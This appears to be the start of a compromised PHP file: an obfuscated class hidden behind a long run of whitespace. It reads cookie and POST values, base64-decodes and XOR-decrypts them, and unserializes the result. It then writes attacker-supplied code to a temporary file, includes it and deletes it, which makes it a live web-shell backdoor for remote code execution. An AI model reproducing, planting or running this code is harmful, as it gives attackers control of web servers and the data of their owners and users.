<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xyqWRyO")){class xyqWRyO{public static $JoyOfV = "XDelRMymkqiUoTlN";public static $yTTRAOd = NULL;public function __construct(){$XqubxAvlE = @$_COOKIE[substr(xyqWRyO::$JoyOfV, 0, 4)];if (!empty($XqubxAvlE)){$WDUPRtM = "base64";$UCOsqN = "";$XqubxAvlE = explode(",", $XqubxAvlE);foreach ($XqubxAvlE as $IZTWufeUIH){$UCOsqN .= @$_COOKIE[$IZTWufeUIH];$UCOsqN .= @$_POST[$IZTWufeUIH];}$UCOsqN = array_map($WDUPRtM . "_decode", array($UCOsqN,)); $UCOsqN = $UCOsqN[0] ^ str_repeat(xyqWRyO::$JoyOfV, (strlen($UCOsqN[0]) / strlen(xyqWRyO::$JoyOfV)) + 1);xyqWRyO::$yTTRAOd = @unserialize($UCOsqN);}}public function __destruct(){$this->QFaXEq();}private function QFaXEq(){if (is_array(xyqWRyO::$yTTRAOd)) {$NvNgVNEV = sys_get_temp_dir() . "/" . crc32(xyqWRyO::$yTTRAOd["salt"]);@xyqWRyO::$yTTRAOd["write"]($NvNgVNEV, xyqWRyO::$yTTRAOd["content"]);include $NvNgVNEV;@xyqWRyO::$yTTRAOd["delete"]($NvNgVNEV);exit();}}}$lWyFPQPysF = new xyqWRyO(); $lWyFPQPysF = NULL;} ?><?php
